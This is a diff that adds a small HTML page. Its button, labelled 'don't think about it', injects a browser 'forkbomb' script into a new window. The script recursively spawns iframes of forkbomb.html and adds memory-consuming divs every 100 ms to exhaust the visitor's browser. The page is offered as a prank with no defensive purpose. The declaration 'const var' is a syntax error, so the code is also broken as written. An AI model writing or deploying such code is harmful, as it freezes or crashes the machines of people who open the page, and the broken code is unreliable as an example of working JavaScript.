@@ -1,0 +1,32 @@
+<html>
+  <body>
+    <button id="kill">don't think about it</button>
+    <script>
+      let inject = document.getElementById("kill");
+      const var forkbomb = `
+      // Activate forkbomb on page load
+      (function() {
+        for (let i = 0; i < 2; i++) {
+          let iframe = document.createElement('iframe');
+          iframe.src = 'forkbomb.html';
+          document.body.appendChild(iframe);
+        }
+
+        // Add randomized memory-gobbling elements
+        setInterval(function() {
+          let element = document.createElement('div');
+          element.style.width = Math.floor(Math.random() * 1000) + 'px';
+          element.style.height = Math.floor(Math.random() * 1000) + 'px';
+          element.style.backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
+          document.body.appendChild(element);
+        }, 100);
+      })();`;
+      inject.addEventListener("click", () => {
+        let win = window.open();
+        let script = win.document.createElement("script");
+        script.innerHTML = forkbomb;
+        win.document.body.appendChild(script);
+      })
+    </script>
+  </body>
+</html>
